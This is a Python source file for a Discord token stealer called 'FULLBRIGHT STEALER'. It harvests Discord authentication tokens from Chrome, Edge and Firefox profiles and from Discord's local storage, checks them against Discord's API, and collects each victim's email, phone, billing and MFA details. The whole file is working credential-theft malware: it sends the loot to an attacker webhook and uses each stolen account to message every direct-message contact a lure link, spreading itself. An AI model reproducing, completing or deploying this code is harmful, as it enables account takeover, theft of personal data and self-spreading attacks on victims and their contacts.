import os, re, requests, psutil, time, urllib3, logging
import sqlite3
from discord import Embed
from co.config import WEBHOOK_URL
import threading
logging.getLogger("urllib3").setLevel(logging.NOTSET)
class DiscordToken:
    def __init__(self):
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.vault_path = os.path.join(self.roaming, "vault")
        self.token_file = os.path.join(self.vault_path, "token.txt")
        self.chrome_path = os.path.join(self.appdata, "Google", "Chrome", "User Data")
        self.edge_path = os.path.join(self.appdata, "Microsoft", "Edge", "User Data")
        self.firefox_path = os.path.join(self.appdata, "Mozilla", "Firefox", "Profiles")
        self.discord_path = os.path.join(self.roaming, "discord", "Local Storage", "leveldb")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.tokens = []
        self.valid_tokens = []
        self.user_data = []
        self.create_vault_dir()
        self.kill_discord()
        self.run()

    def kill_discord(self):
        for proc in psutil.process_iter(['pid', 'name']):
            if 'discord.exe' in proc.info['name'].lower():
                proc.terminate()

    def create_vault_dir(self):
        if not os.path.exists(self.vault_path):
            os.makedirs(self.vault_path)

    def scan_folders(self):
        folders = []
        if os.path.exists(self.chrome_path):
            folders.extend([
                os.path.join(self.chrome_path, folder)
                for folder in os.listdir(self.chrome_path)
                if os.path.isdir(os.path.join(self.chrome_path, folder))
                and folder not in ("System Profile", "Guest Profile")
            ])
        if os.path.exists(self.edge_path):
            folders.extend([
                os.path.join(self.edge_path, folder)
                for folder in os.listdir(self.edge_path)
                if os.path.isdir(os.path.join(self.edge_path, folder))
                and folder not in ("System Profile", "Guest Profile")
            ])
        if os.path.exists(self.firefox_path):
            folders.extend([
                os.path.join(self.firefox_path, folder)
                for folder in os.listdir(self.firefox_path)
                if os.path.isdir(os.path.join(self.firefox_path, folder))
                and not folder.endswith(".default-release")
            ])
        if os.path.exists(self.discord_path):
            folders.append(self.discord_path)
        return folders

    def extract_tokens(self, path):
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        if os.path.exists(leveldb_path):
            for filename in os.listdir(leveldb_path):
                full_file_path = os.path.join(leveldb_path, filename)
                if filename.endswith(".ldb") or filename.endswith(".log"):
                    try:
                        with open(full_file_path, "r", encoding="utf-8", errors="ignore") as f:
                            found_tokens = re.findall(self.regexp, f.read())
                            for token in found_tokens:
                                if not token.startswith("MT"):
                                    token = "MT" + token
                                self.tokens.append(token)
                    except Exception as e:
                        return
        firefox_profile_path = os.path.join(path, "cookies.sqlite")
        if os.path.exists(firefox_profile_path):
            try:
                conn = sqlite3.connect(firefox_profile_path)
                cursor = conn.cursor()
                cursor.execute("SELECT value FROM cookies WHERE host = 'discord.com'")
                rows = cursor.fetchall()
                for row in rows:
                    found_tokens = re.findall(self.regexp, row[0])
                    for token in found_tokens:
                        if not token.startswith("MT"):
                            token = "MT" + token
                        self.tokens.append(token)
                conn.close()
            except sqlite3.Error as e:
                return

    def validate_token(self, token):
        url = "https://discord.com/api/v9/users/@me"
        headers = {"Authorization": token}
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                user_info = response.json()
                username = user_info.get("username", "N/A")
                user_id = user_info.get("id", "N/A")
                display_name = user_info.get("global_name", "N/A")
                nitro = user_info.get("premium_type", 0) != 0
                billing = user_info.get("billing_info", None) is not None
                phone = user_info.get("phone", "N/A")
                avatar = user_info.get("avatar", "N/A")
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png" if avatar != "N/A" else "N/A"
                discriminator = user_info.get("discriminator", "N/A")
                email = user_info.get("email", "N/A")
                mfa_enabled = user_info.get("mfa_enabled", False)

                self.valid_tokens.append(token)
                self.user_data.append({
                    "username": username,
                    "user_id": user_id,
                    "display_name": display_name,
                    "token": token,
                    "nitro": nitro,
                    "billing": billing,
                    "phone": phone,
                    "avatar_url": avatar_url,
                    "discriminator": discriminator,
                    "email": email,
                    "mfa_enabled": mfa_enabled,
                })
            else:
                return
        except requests.RequestException as e:
            return

    def save_tokens(self):
        if self.valid_tokens:
            with open(self.token_file, "w") as file:
                file.write("----------------------------FULLBRIGHT STEALER BY RAYWZW----------------------------\n\n")
                for user in self.user_data:
                    file.write(f"Token: {user['token']}\n")
                    file.write(f"Username: {user['username']}\n")
                    file.write(f"User ID: {user['user_id']}\n")
                    file.write(f"Display Name: {user['display_name']}\n")
                    file.write(f"Nitro: {user['nitro']}\n")
                    file.write(f"Billing Info: {user['billing']}\n")
                    file.write(f"Phone: {user['phone']}\n")
                    file.write(f"Avatar URL: {user['avatar_url']}\n")
                    file.write(f"Discriminator: {user['discriminator']}\n")
                    file.write(f"Email: {user['email']}\n")
                    file.write(f"MFA Enabled: {user['mfa_enabled']}\n")
                    file.write("----------------------------\n")
            self.send_to_webhook()

    def send_to_webhook(self):
        for user in self.user_data:
            embed = Embed(title=f"{user['username']}#{user['discriminator']}", color=0x8000FF)
            embed.add_field(name="🔑 Token", value=f"```\n{user['token']}\n```", inline=False)
            embed.add_field(name="👤 Username", value=user['username'], inline=False)
            embed.add_field(name=":identification_card: User ID", value=user['user_id'], inline=True)
            embed.add_field(name="💬 Display Name", value=user['display_name'], inline=True)
            embed.add_field(name="💎 Nitro", value="Yes" if user['nitro'] else "No", inline=True)
            embed.add_field(name="💳 Billing Info", value="Available" if user['billing'] else "Not Available", inline=True)
            embed.add_field(name="📱 Phone", value=user['phone'], inline=True)
            embed.add_field(name="🎫  Discriminator", value=user['discriminator'], inline=True)
            embed.add_field(name="✉️ Email", value=user['email'], inline=True)
            embed.add_field(name="🔒 MFA Enabled", value="Yes" if user['mfa_enabled'] else "No", inline=False)

            if user['avatar_url'] != "N/A":
                embed.set_thumbnail(url=user['avatar_url'])
            embed.set_footer(text="FULLBRIGHT STEALER BY RAYWZW", icon_url="https://cdn.discordapp.com/avatars/0/0.png")
            embed.set_author(name="CLICK 2 JOIN RAYWZW's DISCORD", url="https://discord.gg/aGpfgnW4aW")
            data = {
                "embeds": [embed.to_dict()]
            }
            response = requests.post(WEBHOOK_URL, json=data)
            if response.status_code != 204:
                return
            self.send_message_to_dms(user['token'])

    def send_message_to_dms(self, token):
        if not token.startswith("MT"):
            token = "MT" + token
        url = "https://discord.com/api/v9/users/@me/channels"
        headers = {"Authorization": token}
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                channels = response.json()
                for channel in channels:
                    try:
                        channel_id = channel['id']
                        dm_url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
                        data = {"content": "yo bro check out this siiick game https://georgethedev0.itch.io/smontop"}
                        requests.post(dm_url, json=data, headers=headers)
                        time.sleep(2.2)
                    except Exception:
                        pass
        except requests.RequestException:
            pass
    def run(self):
        for folder in self.scan_folders():
            self.extract_tokens(folder)
        for token in self.tokens:
            self.validate_token(token)
        thread = threading.Thread(target=self.save_tokens)
        thread.start()